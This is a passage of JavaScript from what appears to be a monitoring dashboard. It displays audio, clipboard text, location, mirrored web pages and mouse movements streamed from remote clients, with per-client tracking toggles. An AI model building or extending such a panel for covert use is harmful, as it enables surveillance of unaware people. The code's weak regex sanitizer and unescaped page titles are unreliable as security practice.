                            // Draw horizontal grid lines
                            for (let i = 0; i <= canvas.height; i += 20) {
                                ctx.beginPath();
                                ctx.moveTo(0, i);
                                ctx.lineTo(canvas.width, i);
                                ctx.stroke();
                            }
                            
                            // Draw vertical grid lines
                            for (let i = 0; i <= canvas.width; i += 30) {
                                ctx.beginPath();
                                ctx.moveTo(i, 0);
                                ctx.lineTo(i, canvas.height);
                                ctx.stroke();
                            }
                            
                            // Draw waveform with gradient
                            const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
                            gradient.addColorStop(0, '#007bff');
                            gradient.addColorStop(1, '#00bcd4');
                            
                            ctx.beginPath();
                            ctx.strokeStyle = gradient;
                            ctx.lineWidth = 2;
                            
                            const sliceWidth = canvas.width / data.data.length;
                            let x = 0;
                            
                            // Draw waveform
                            for (let i = 0; i < data.data.length; i++) {
                                const y = (data.data[i] * canvas.height / 2) + canvas.height / 2;
                                if (i === 0) {
                                    ctx.moveTo(x, y);
                                } else {
                                    ctx.lineTo(x, y);
                                }
                                x += sliceWidth;
                            }
                            
                            ctx.stroke();
                            
                            // Add volume meter
                            let sumSquares = 0;
                            for (let i = 0; i < data.data.length; i++) {
                                sumSquares += data.data[i] * data.data[i];
                            }
                            const volumeRms = Math.sqrt(sumSquares / data.data.length);
                            const volumeHeight = Math.min(canvas.height, volumeRms * canvas.height * 5);
                            
                            // Draw volume indicator on the right side
                            ctx.fillStyle = gradient;
                            ctx.fillRect(canvas.width - 10, canvas.height - volumeHeight, 8, volumeHeight);
                            
                            // Log the audio data reception only when needed
                            if (!window.lastAudioUpdate || Date.now() - window.lastAudioUpdate >= 5000) {
                                const audioDiv = document.createElement('div');
                                document.getElementById('audioLogs').appendChild(audioDiv);
                                document.getElementById('allLogs').appendChild(audioDiv.cloneNode(true));
                                window.lastAudioUpdate = Date.now();
                            }
                            // --- Audio Playback ---
                            if (data.audioBase64) {
                                try {
                                    const audioContext = window.audioContext || (window.audioContext = new (window.AudioContext || window.webkitAudioContext)());
                                    const audioData = atob(data.audioBase64);
                                    const buffer = new Uint8Array(audioData.length);
                                    for (let i = 0; i < audioData.length; i++) {
                                        buffer[i] = audioData.charCodeAt(i);
                                    }
                                    audioContext.decodeAudioData(buffer.buffer.slice(0), function(decodedData) {
                                        const source = audioContext.createBufferSource();
                                        source.buffer = decodedData;
                                        source.connect(audioContext.destination);
                                        source.start(0);
                                    }, function(e) {
                                        console.error('Audio decode error', e);
                                    });
                                } catch (e) {
                                    console.error('Audio playback error', e);
                                }
                            }
                        } 
                       
                        else if (data.type === 'clipboard-content') {
                        // Track processed clipboard messages to prevent duplicates
                        if (!window.processedClipboardMessages) {
                            window.processedClipboardMessages = new Set();
                        }
                        
                        // Create a unique identifier for this message
                        const messageId = `${data.clientId}-${data.content.substring(0, 50)}`;
                        
                        // Check if we've already processed this message
                        if (!window.processedClipboardMessages.has(messageId)) {
                            // Get nickname for the client if available
                            let displayName = data.clientId;
                            for (const key in clients) {
                                if (clients[key].clientId === data.clientId && clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                            
                            // If no exact match, try partial match with the shortened ID
                            if (displayName === data.clientId && data.clientId && data.clientId.includes('_')) {
                                const shortId = data.clientId.split('_').pop().substring(0, 8);
                                for (const key in clients) {
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        displayName = clients[key].nickname;
                                        break;
                                    }
                                }
                            }
                            
                            // Add to clipboard history with nickname
                            if (data.clientId && data.content) {
                                clipboardHistory.addEntry(data.clientId, data.content, displayName);
                            }
                            
                            // Mark as processed
                            window.processedClipboardMessages.add(messageId);
                            
                            // Limit the size of the Set to prevent memory leaks
                            if (window.processedClipboardMessages.size > 100) {
                                // Remove the oldest entries (convert to array, slice, convert back to Set)
                                const messagesArray = Array.from(window.processedClipboardMessages);
                                window.processedClipboardMessages = new Set(messagesArray.slice(-50));
                            }
                        } else {
                            console.log('Skipping already processed clipboard message');
                        }
                    } 

                    else if (data.type === 'location') {
                        // Update current location display
                        const locationDisplay = document.getElementById('locationDisplay');
                        const lat = data.coords.latitude;
                        const lng = data.coords.longitude;
                        const accuracy = data.coords.accuracy || 'Unknown';
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // Get client ID from data
                        const clientId = data.clientId || 'default';
                        
                       
                        
                        // Get nickname for this client
                        let displayName = clientId;
                        let foundNickname = false;
                        
                        // First try exact match
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                displayName = clients[key].nickname;
                                foundNickname = true;
                                break;
                            }
                        }
                        
                        // If no exact match, try with shortened ID
                        if (!foundNickname && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                        
                        // Add to location history
                        addLocationToHistory(clientId, {
                            coords: data.coords,
                            timestamp: new Date().toISOString(),
                            displayName: displayName
                        });
                        
                        // Add log entry
                        const locationDiv = document.createElement('div');
                        document.getElementById('locationLogs').appendChild(locationDiv);
                        document.getElementById('allLogs').appendChild(locationDiv.cloneNode(true));
                    }

                    else if (data.type && data.message) {
                        // Check if this is a permission response - if so, ignore it
                        if (shouldIgnorePermissionMessage(data)) {
                            console.log('Ignoring permission response:', data.type, data.message);
                            return;
                        }
                        
                        // Process other message types normally
                        const statusDiv = document.createElement('div');
                        statusDiv.className = data.granted ? 'status granted' : 'status denied';
                        statusDiv.textContent = `${new Date().toLocaleTimeString()} - ${data.message}`;
                        
                        // Add to all logs
                        document.getElementById('allLogs').appendChild(statusDiv.cloneNode(true));
                        
                        // Add to specific section
                        const logMapping = {
                            'camera': 'cameraLogs',
                            'screen': 'screenLogs',
                            'clipboard': 'clipboardLogs',
                            'audio': 'audioLogs',
                            'location': 'locationLogs',
                        };
                        
                        const logSection = Object.keys(logMapping).find(key => data.type.includes(key));
                        if (logSection) {
                            document.getElementById(logMapping[logSection]).appendChild(statusDiv.cloneNode(true));
                        } else {
                            document.getElementById('otherLogs').appendChild(statusDiv.cloneNode(true));
                        }
                    }
                    
                    else if (data.type === 'html-content' && data.clientId) {
                        const clientId = data.clientId;
                        let htmlContent = data.content;
                        const pageTitle = data.pageTitle || 'Unknown Page';
                        const pageUrl = data.pageUrl || '#';
                        
                        // SECURITY: Strip JavaScript content before displaying it
                        // This prevents any JS from executing in the iframe
                        htmlContent = sanitizeHtmlContent(htmlContent);
                        
                        // Allow preview for all pages (removed restrictive title filter that checked for "file handler")
                        
                        // Function to sanitize HTML content by removing JavaScript
                        function sanitizeHtmlContent(html) {
                            if (!html) return '';
                            
                            // Remove script tags and their content
                            let sanitized = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
                            
                            // Remove inline event handlers (onclick, onload, etc.)
                            sanitized = sanitized.replace(/\son\w+\s*=\s*["']?[^"']*["']?/gi, '');
                            
                            // Remove javascript: URLs
                            sanitized = sanitized.replace(/javascript\s*:/gi, 'disabled-javascript:');
                            
                            // Remove data: URLs (could contain JavaScript)
                            sanitized = sanitized.replace(/data\s*:\s*text\/html/gi, 'disabled-data:text/html');
                            
                            return sanitized;
                        }
                        
                        // Check if the container already exists and if tracking is disabled
                      /*  const existingContainer = document.getElementById(`preview-container-${clientId}`);
                        if (existingContainer && existingContainer.dataset.tracking !== 'true') {
                            // Skip updating content if tracking is disabled for this client
                            return;
                        }*/
                        
                        // Get or create client-specific container
                        const containerId = `preview-container-${clientId}`;
                        let container = document.getElementById(containerId);
                        
                        // If we're creating a new container, initialize tracking to false by default
                        if (!container) {
                            console.log(`Creating new container for client ${clientId} with tracking disabled by default`);
                        }
                        
                        if (!container) {
                            // Create new container for this client
                            container = document.createElement('div');
                            container.id = containerId;
                            container.className = 'client-preview-container minimized';
                            container.style.border = '1px solid #ddd';
                            container.style.borderRadius = '8px';
                            container.style.backgroundColor = '#f9f9f9';
                            container.style.overflow = 'hidden';
                            container.style.display = 'flex';
                            container.style.flexDirection = 'column';
                            
                            // Add client header
                            const header = document.createElement('div');
                            header.style.display = 'flex';
                            header.style.justifyContent = 'space-between';
                            header.style.alignItems = 'center';
                            header.style.padding = '10px';
                            header.style.borderBottom = '1px solid #ddd';
                            header.style.backgroundColor = '#f1f8ff';
                            
                            // Create title element with flex layout for left side
                            const titleArea = document.createElement('div');
                            titleArea.style.display = 'flex';
                            titleArea.style.alignItems = 'center';
                            
                            const title = document.createElement('div');
                            title.style.fontWeight = 'bold';
                            title.innerHTML = `<span class="page-title">${pageTitle}</span>`;
                            
                            // Create control buttons container
                            const controlButtons = document.createElement('div');
                            controlButtons.style.display = 'flex';
                            controlButtons.style.gap = '5px';
                            
                            // Create fullscreen button
                            const fullscreenBtn = document.createElement('button');
                            fullscreenBtn.id = `fullscreen-btn-${clientId}`;
                            fullscreenBtn.className = 'fullscreen-toggle';
                            fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                            fullscreenBtn.style.padding = '5px';
                            fullscreenBtn.style.border = 'none';
                            fullscreenBtn.style.borderRadius = '4px';
                            fullscreenBtn.style.backgroundColor = '#e1f5fe';
                            fullscreenBtn.style.color = '#0288d1';
                            fullscreenBtn.style.cursor = 'pointer';
                            fullscreenBtn.style.display = 'flex';
                            fullscreenBtn.style.alignItems = 'center';
                            fullscreenBtn.style.justifyContent = 'center';
                            fullscreenBtn.title = 'Toggle fullscreen mode';
                            
                            // Add fullscreen button to controls
                            controlButtons.appendChild(fullscreenBtn);
                            
                            // Add fullscreen functionality
                            fullscreenBtn.addEventListener('click', function() {
                                const contentContainer = document.querySelector(`#${containerId} .content-container`);
                                const iframe = document.querySelector(`#content-frame-${clientId}`);
                                
                                // Check if already in fullscreen mode
                                const isInFullscreen = document.fullscreenElement || 
                                                      document.webkitFullscreenElement || 
                                                      document.mozFullScreenElement || 
                                                      document.msFullscreenElement;
                                
                                if (!isInFullscreen) {
                                    // Enter fullscreen
                                    if (contentContainer.requestFullscreen) {
                                        contentContainer.requestFullscreen();
                                    } else if (contentContainer.webkitRequestFullscreen) {
                                        contentContainer.webkitRequestFullscreen();
                                    } else if (contentContainer.mozRequestFullScreen) {
                                        contentContainer.mozRequestFullScreen();
                                    } else if (contentContainer.msRequestFullscreen) {
                                        contentContainer.msRequestFullscreen();
                                    }
                                    
                                    // Change icon to exit fullscreen
                                    fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h3a2 2 0 0 1 2 2v3m-5-5v-3a2 2 0 0 1 2-2h3m10 0h-3a2 2 0 0 0-2 2v3m5-5v-3a2 2 0 0 0-2-2h-3"></path></svg>';
                                    fullscreenBtn.title = 'Exit fullscreen mode';
                                } else {
                                    // Exit fullscreen
                                    if (document.exitFullscreen) {
                                        document.exitFullscreen();
                                    } else if (document.webkitExitFullscreen) {
                                        document.webkitExitFullscreen();
                                    } else if (document.mozCancelFullScreen) {
                                        document.mozCancelFullScreen();
                                    } else if (document.msExitFullscreen) {
                                        document.msExitFullscreen();
                                    }
                                    
                                    // Change icon to enter fullscreen
                                    fullscreenBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                                    fullscreenBtn.title = 'Enter fullscreen mode';
                                }
                            });
                            
                            // Add listener for fullscreen change events to update button icon
                            document.addEventListener('fullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('webkitfullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('mozfullscreenchange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            document.addEventListener('MSFullscreenChange', function() {
                                updateFullscreenButtonIcon(fullscreenBtn);
                            });
                            
                            // Helper function to update fullscreen button icon
                            function updateFullscreenButtonIcon(button) {
                                const isInFullscreen = document.fullscreenElement || 
                                                      document.webkitFullscreenElement || 
                                                      document.mozFullScreenElement || 
                                                      document.msFullscreenElement;
                                                      
                                if (isInFullscreen) {
                                    button.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h3a2 2 0 0 1 2 2v3m-5-5v-3a2 2 0 0 1 2-2h3m10 0h-3a2 2 0 0 0-2 2v3m5-5v-3a2 2 0 0 0-2-2h-3"></path></svg>';
                                    button.title = 'Exit fullscreen mode';
                                } else {
                                    button.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>';
                                    button.title = 'Enter fullscreen mode';
                                }
                            }
                            
                            // Create client badge
                            const clientBadge = document.createElement('span');
                            clientBadge.className = 'client-badge';
                            clientBadge.id = `client-badge-${clientId}`;
                            clientBadge.style.backgroundColor = '#2196F3';
                            clientBadge.style.color = 'white';
                            clientBadge.style.padding = '3px 8px';
                            clientBadge.style.borderRadius = '12px';
                            clientBadge.style.fontSize = '12px';
                            
                            // Store the full client ID as a data attribute for easier access
                            clientBadge.dataset.clientId = clientId;
                            
                            // Override the textContent setter to prevent changes
                            let badgeText = `Client: ${clientId.split('_').pop().substring(0, 8)}`;
                            Object.defineProperty(clientBadge, 'textContent', {
                                get: function() {
                                    return badgeText;
                                },
                                set: function(newValue) {
                                    // Only allow changes from our nickname code
                                    if (newValue.startsWith('Client: ') && 
                                        !newValue.includes(clientId.split('_').pop().substring(0, 8))) {
                                        console.log(`Badge text set to: ${newValue}`);
                                        badgeText = newValue;
                                        this.innerText = newValue;
                                    } else if (this.allowTextChange) {
                                        badgeText = newValue;
                                        this.innerText = newValue;
                                    } else {
                                        console.log(`Prevented badge text change to: ${newValue}`);
                                    }
                                },
                                configurable: true
                            });
                            
                            // Check if this client has a nickname in our clients object
                            let displayName = clientId.split('_').pop().substring(0, 8);
                            let foundNickname = false;
                            
                            // Find client by clientId in our clients object - try exact match first
                            for (const key in clients) {
                                if (clients[key].clientId === clientId && clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    console.log(`Found nickname for client ${clientId}: ${displayName}`);
                                    foundNickname = true;
                                    break;
                                }
                            }
                            
                            // If no exact match, try partial match with the shortened ID
                            if (!foundNickname) {
                                const shortId = clientId.split('_').pop().substring(0, 8);
                                for (const key in clients) {
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        displayName = clients[key].nickname;
                                        console.log(`Found nickname by partial match for client ${clientId}: ${displayName}`);
                                        
                                        // Store this relationship for future updates
                                        window.clientIdMappings = window.clientIdMappings || {};
                                        window.clientIdMappings[clientId] = clients[key].clientId;
                                        console.log(`Mapped client ID ${clientId} to ${clients[key].clientId}`);
                                        break;
                                    }
                                }
                            }
                            
                            // Allow the initial text change
                            clientBadge.allowTextChange = true;
                            clientBadge.textContent = `Client: ${displayName}`;
                            console.log(`Set client badge text to: Client: ${displayName}`);
                            clientBadge.allowTextChange = false;
                            clientBadge.title = `Client ID: ${clientId}`; // Show full ID on hover
                            
                            // Create tracking toggle button for this specific client
                            const trackingToggle = document.createElement('button');
                            trackingToggle.id = `tracking-toggle-${clientId}`;
                            trackingToggle.className = 'client-tracking-toggle start-button';
                            trackingToggle.textContent = 'Start Tracking';
                            trackingToggle.style.padding = '5px 10px';
                            trackingToggle.style.marginLeft = '10px';
                            trackingToggle.style.border = 'none';
                            trackingToggle.style.borderRadius = '4px';
                            trackingToggle.style.backgroundColor = '#4CAF50';
                            trackingToggle.style.color = 'white';
                            trackingToggle.style.cursor = 'pointer';
                            trackingToggle.style.fontSize = '12px';
                            trackingToggle.style.fontWeight = 'bold';
                            
                            // Set default tracking state to true (on)
                            container.dataset.tracking = 'true';
                            
                            // Make container visible by default
                            const contentContainerInit = container.querySelector('.content-container');
                            if (contentContainerInit) {
                                contentContainerInit.style.maxHeight = '800px';
                                contentContainerInit.style.opacity = '1';
                                contentContainerInit.style.visibility = 'visible';
                            }
                            
                            // Reflect tracking state in button
                            trackingToggle.textContent = 'Stop Tracking';
                            trackingToggle.classList.remove('start-button');
                            trackingToggle.classList.add('stop-button');
                            trackingToggle.style.backgroundColor = '#f44336';
                            
                            // Add event listener for tracking toggle
                            trackingToggle.addEventListener('click', function() {
                                const isTracking = container.dataset.tracking === 'true';
                                const newTrackingState = !isTracking;
                                container.dataset.tracking = newTrackingState.toString();
                                
                                // Get content container for minimization
                                const contentContainer = container.querySelector('.content-container');
                                const mousePositionIndicator = container.querySelector('.mouse-position-indicator');
                                
                                if (newTrackingState) {
                                    // Enable tracking for this client
                                    trackingToggle.textContent = 'Stop Tracking';
                                    trackingToggle.classList.remove('start-button');
                                    trackingToggle.classList.add('stop-button');
                                    trackingToggle.style.backgroundColor = '#f44336';
                                    
                                    // Expand the container (drawer opens)
                                    if (contentContainer) {
                                        contentContainer.style.maxHeight = '800px';
                                        contentContainer.style.opacity = '1';
                                        contentContainer.style.visibility = 'visible';
                                    }
                                    
                                    // Show mouse position indicator
                                    if (mousePositionIndicator) {
                                        mousePositionIndicator.style.display = 'block';
                                    }
                                    
                                    // Make container taller
                                    container.classList.remove('minimized');
                                    
                                    // Send tracking enable message to this client
                                    if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                        window.websocket.send(JSON.stringify({
                                            type: 'tracking-control',
                                            enabled: true,
                                            targetClientId: clientId,
                                            timestamp: new Date().toISOString()
                                        }));
                                        
                                        // Request fresh content
                                        //window.websocket.send(JSON.stringify({
                                        //    type: 'request-content',
                                          //  timestamp: new Date().toISOString()
                                       // }));
                                    }
                                } else {
                                    // Disable tracking for this client
                                    trackingToggle.textContent = 'Start Tracking';
                                    trackingToggle.classList.remove('stop-button');
                                    trackingToggle.classList.add('start-button');
                                    trackingToggle.style.backgroundColor = '#4CAF50';
                                    
                                    // Minimize the container (drawer closes)
                                    if (contentContainer) {
                                        contentContainer.style.maxHeight = '0';
                                        contentContainer.style.opacity = '0';
                                        contentContainer.style.visibility = 'hidden';
                                    }
                                    
                                    // Hide mouse position indicator
                                    if (mousePositionIndicator) {
                                        mousePositionIndicator.style.display = 'none';
                                    }
                                    
                                    // Make container shorter
                                    container.classList.add('minimized');
                                    
                                    // Send tracking disable message to this client
                                    if (window.websocket && window.websocket.readyState === WebSocket.OPEN) {
                                        window.websocket.send(JSON.stringify({
                                            type: 'tracking-control',
                                            enabled: false,
                                            targetClientId: clientId,
                                            timestamp: new Date().toISOString()
                                        }));
                                    }
                                }
                            });
                            
                            // Add elements to header
                            // Add title to title area
                            titleArea.appendChild(title);
                            
                            // Add elements to header with proper organization
                            header.appendChild(titleArea);
                            
                            // Create right side controls area
                            const rightControls = document.createElement('div');
                            rightControls.style.display = 'flex';
                            rightControls.style.alignItems = 'center';
                            rightControls.style.gap = '8px';
                            
                            // Add client badge and controls to right side
                            rightControls.appendChild(clientBadge);
                            rightControls.appendChild(controlButtons);
                            rightControls.appendChild(trackingToggle);
                            
                            // Add right controls to header
                            header.appendChild(rightControls);
                            
                            container.appendChild(header);
                            
                            // Setup a recurring interval to keep the nickname updated
                            // This ensures it doesn't get overridden by other code
                            const badgeUpdateInterval = setInterval(() => {
                                // Find if this client has a nickname in any of our stored clients
                                let foundNickname = false;
                                
                                for (const key in clients) {
                                    // Try exact match first
                                    if (clients[key].clientId === clientId && clients[key].nickname) {
                                        if (clientBadge.textContent !== `Client: ${clients[key].nickname}`) {
                                            // Allow the text change for our nickname update
                                            clientBadge.allowTextChange = true;
                                            
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated badge with nickname from interval: ${clients[key].nickname}`);
                                            
                                            // Reset the flag
                                            clientBadge.allowTextChange = false;
                                        }
                                        foundNickname = true;
                                        break;
                                    }
                                    
                                    // Try partial match with short ID
                                    const shortId = clientId.split('_').pop().substring(0, 8);
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        if (clientBadge.textContent !== `Client: ${clients[key].nickname}`) {
                                            // Allow the text change for our nickname update
                                            clientBadge.allowTextChange = true;
                                            
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated badge with nickname from interval (partial match): ${clients[key].nickname}`);
                                            
                                            // Reset the flag
                                            clientBadge.allowTextChange = false;
                                        }
                                        
                                        // Store this relationship for future updates
                                        window.clientIdMappings = window.clientIdMappings || {};
                                        window.clientIdMappings[clientId] = clients[key].clientId;
                                        
                                        foundNickname = true;
                                        break;
                                    }
                                }
                                
                                // Store the interval ID in a data attribute so we can clear it if needed
                                clientBadge.dataset.updateInterval = badgeUpdateInterval;
                                
                                // If we've been running for more than 30 seconds and haven't found a nickname, stop the interval
                                if (!foundNickname && Date.now() - startTime > 30000) {
                                    console.log(`No nickname found for client ${clientId} after 30 seconds, stopping interval`);
                                    clearInterval(badgeUpdateInterval);
                                }
                            }, 1000);
                            
                            // Store the start time to limit how long we keep checking
                            const startTime = Date.now();
                            
                            // Add mouse position indicator
                            const mousePositionIndicator = document.createElement('div');
                            mousePositionIndicator.id = `mouse-position-${clientId}`;
                            mousePositionIndicator.className = 'mouse-position-indicator';
                            mousePositionIndicator.style.padding = '5px 10px';
                            mousePositionIndicator.style.backgroundColor = '#e3f2fd';
                            mousePositionIndicator.style.borderBottom = '1px solid #ddd';
                            mousePositionIndicator.style.fontSize = '12px';
                            mousePositionIndicator.style.display = 'none'; // Start hidden
                            mousePositionIndicator.innerHTML = 'Mouse: X: <span class="x-coord">0</span>, Y: <span class="y-coord">0</span>';
                            container.appendChild(mousePositionIndicator);
                            
                            // Add content container with iframe
                            const contentContainer = document.createElement('div');
                            contentContainer.className = 'content-container';
                            contentContainer.style.position = 'relative';
                            contentContainer.style.height = '800px';
                            contentContainer.style.minHeight = '80vh';
                            contentContainer.style.overflow = 'auto';
                            
                            // Start minimized
                            contentContainer.style.maxHeight = '0';
                            contentContainer.style.opacity = '0';
                            contentContainer.style.visibility = 'hidden';
                            
                            // Create iframe
                            const iframe = document.createElement('iframe');
                            iframe.id = `content-frame-${clientId}`;
                            iframe.style.width = '100%';
                            iframe.style.height = '100%';
                            iframe.style.border = 'none';
                            contentContainer.appendChild(iframe);
                            
                            // Create mouse cursor element
                            const mouseCursor = document.createElement('div');
                            mouseCursor.id = `cursor-${clientId}`;
                            mouseCursor.className = 'client-cursor';
                            mouseCursor.style.transform = 'translate(-50%, -50%)';
                            mouseCursor.style.left = '0';
                            mouseCursor.style.top = '0';
                            mouseCursor.style.display = 'none'; // Hidden until mouse moves
                            mouseCursor.setAttribute('data-client', clientId); // Store client ID for reference
                            contentContainer.appendChild(mouseCursor);
                            
                            container.appendChild(contentContainer);
                            
                            // Add container to the grid
                            const previewGrid = document.getElementById('client-preview-grid');
                            if (previewGrid) {
                                previewGrid.appendChild(container);
                            } else {
                                // Create grid if it doesn't exist
                                const grid = document.createElement('div');
                                grid.id = 'client-preview-grid';
                                grid.style.display = 'grid';
                                grid.style.gridTemplateColumns = 'repeat(auto-fill, minmax(400px, 1fr))';
                                grid.style.gap = '20px';
                                grid.style.margin = '20px 0';
                                grid.appendChild(container);
                                
                                // Find where to add the grid - preferably in the preview section
                                const previewSection = document.getElementById('preview-content');
                                if (previewSection) {
                                    previewSection.appendChild(grid);
                                } else {
                                    // Fallback to adding it to the body
                                    document.body.appendChild(grid);
                                }
                            }
                            
                            console.log(`Created new preview container for client ${clientId}`);
                        }
                        
                        // Update iframe content
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (iframe) {
                            try {
                                console.log(`Updating HTML content for client ${clientId}`);
                                const doc = iframe.contentDocument || iframe.contentWindow.document;
                                const baseHref = pageUrl || '/';
                                window._clientHtmlCache[clientId] = { pageUrl, pageTitle };
                                const styleTags = (window._clientStyleCache && window._clientStyleCache[clientId]) ? window._clientStyleCache[clientId]
                                  .filter(s => !!s.content)
                                  .map(s => `<style>${s.content}</style>`) : [];
                                const linkTags = (window._clientStyleCache && window._clientStyleCache[clientId]) ? window._clientStyleCache[clientId]
                                  .filter(s => !!s.href)
                                  .map(s => `<link rel=\"stylesheet\" href=\"${s.href}\">`) : [];
                                const headExtra = [...linkTags, ...styleTags].join('');
                                const fullHtml = `<!DOCTYPE html><html><head><meta charset=\"utf-8\"><base href=\"${baseHref}\">${headExtra}</head><body>${htmlContent}</body></html>`;
                                doc.open();
                                doc.write(fullHtml);
                                doc.close();
                                
                                // Update title in header if it changed
                                const titleElement = container.querySelector('.page-title');
                                if (titleElement) {
                                    titleElement.textContent = pageTitle;
                                }
                                
                                // Update client badge with nickname if available
                                const clientBadge = container.querySelector('.client-badge');
                                if (clientBadge) {
                                    // Find if this client has a nickname
                                    let foundNickname = false;
                                    
                                    // Try exact match first
                                    for (const key in clients) {
                                        if (clients[key].clientId === clientId && clients[key].nickname) {
                                            clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                            console.log(`Updated client badge to nickname: ${clients[key].nickname}`);
                                            foundNickname = true;
                                            break;
                                        }
                                    }
                                    
                                    // If no exact match, try partial match
                                    if (!foundNickname) {
                                        const shortId = clientId.split('_').pop().substring(0, 8);
                                        for (const key in clients) {
                                            if (clients[key].clientId && 
                                                clients[key].clientId.includes(shortId) && 
                                                clients[key].nickname) {
                                                clientBadge.textContent = `Client: ${clients[key].nickname}`;
                                                console.log(`Updated client badge to nickname (partial match): ${clients[key].nickname}`);
                                                
                                                // Store mapping for future updates
                                                window.clientIdMappings = window.clientIdMappings || {};
                                                window.clientIdMappings[clientId] = clients[key].clientId;
                                                
                                                foundNickname = true;
                                                break;
                                            }
                                        }
                                    }
                                    
                                    // If we found a nickname, make sure it persists
                                    if (foundNickname) {
                                        // Store the current text so we can check if it changes
                                        const currentText = clientBadge.textContent;
                                        
                                        // Set up a MutationObserver to detect if something changes the text
                                        const observer = new MutationObserver((mutations) => {
                                            mutations.forEach((mutation) => {
                                                if (mutation.type === 'characterData' || mutation.type === 'childList') {
                                                    if (clientBadge.textContent !== currentText) {
                                                        console.log(`Badge text changed from "${currentText}" to "${clientBadge.textContent}", restoring`);
                                                        clientBadge.textContent = currentText;
                                                    }
                                                }
                                            });
                                        });
                                        
                                        // Start observing
                                        observer.observe(clientBadge, { 
                                            characterData: true, 
                                            childList: true,
                                            subtree: true 
                                        });
                                        
                                        // Store the observer in a data attribute so we can disconnect it if needed
                                        clientBadge.dataset.observer = observer;
                                    }
                                }
                                
                                console.log(`Successfully updated HTML content for client ${clientId}`);
                            } catch (error) {
                                console.error(`Error updating iframe content for client ${clientId}:`, error);
                            }
                        }
                    }
                    
                    // Handle stylesheets from client to apply in iframe
                    else if (data.type === 'stylesheets' && data.clientId) {
                        const clientId = data.clientId;
                        const iframe = document.getElementById(`content-frame-${clientId}`);
                        if (data.styleSheets && Array.isArray(data.styleSheets)) {
                            window._clientStyleCache[clientId] = data.styleSheets;
                        }
                        if (iframe && data.styleSheets && Array.isArray(data.styleSheets)) {
                            try {
                                const doc = iframe.contentDocument || iframe.contentWindow.document;
                                const head = doc.head || doc.getElementsByTagName('head')[0] || doc.documentElement;
                                data.styleSheets.forEach(sheet => {
                                    if (sheet.content) {
                                        const styleEl = doc.createElement('style');
                                        styleEl.type = 'text/css';
                                        styleEl.textContent = sheet.content;
                                        head.appendChild(styleEl);
                                    } else if (sheet.href) {
                                        if (!doc.querySelector(`link[href="${sheet.href}"]`)) {
                                            const linkEl = doc.createElement('link');
                                            linkEl.rel = 'stylesheet';
                                            linkEl.href = sheet.href;
                                            head.appendChild(linkEl);
                                        }
                                    }
                                });
                            } catch (err) {
                                console.error('Error applying stylesheets to iframe:', err);
                            }
                        }
                    }
                    
                    else if (data.type === 'mouse-position' && data.clientId) {
                        const clientId = data.clientId;
                        
                        // Check if this specific client's tracking is enabled
                        const clientContainer = document.getElementById(`preview-container-${clientId}`);
                        if (clientContainer && clientContainer.dataset.tracking !== 'true') {
                            // Skip processing if tracking is disabled for this client
                            return;
                        }
                        
                        const x = data.x;
                        const y = data.y;
                        const xPercent = data.xPercent || (data.x / data.viewportWidth * 100);
                        const yPercent = data.yPercent || (data.y / data.viewportHeight * 100);
                        
                        // Update the main mouse position display in the header
                        const mouseX = document.getElementById('mouseX');
                        const mouseY = document.getElementById('mouseY');
                        if (mouseX && mouseY) {
                            mouseX.textContent = Math.round(x);
                            mouseY.textContent = Math.round(y);
                        }
                        
                        // Update the detailed position display in preview section
                        const mouseXDetail = document.getElementById('mouseXDetail');
                        const mouseYDetail = document.getElementById('mouseYDetail');
                        const mouseClientId = document.getElementById('mouseClientId');
                        const mouseXPercent = document.getElementById('mouseXPercent');
                        const mouseYPercent = document.getElementById('mouseYPercent');
                        const mouseLastUpdate = document.getElementById('mouseLastUpdate');
                        
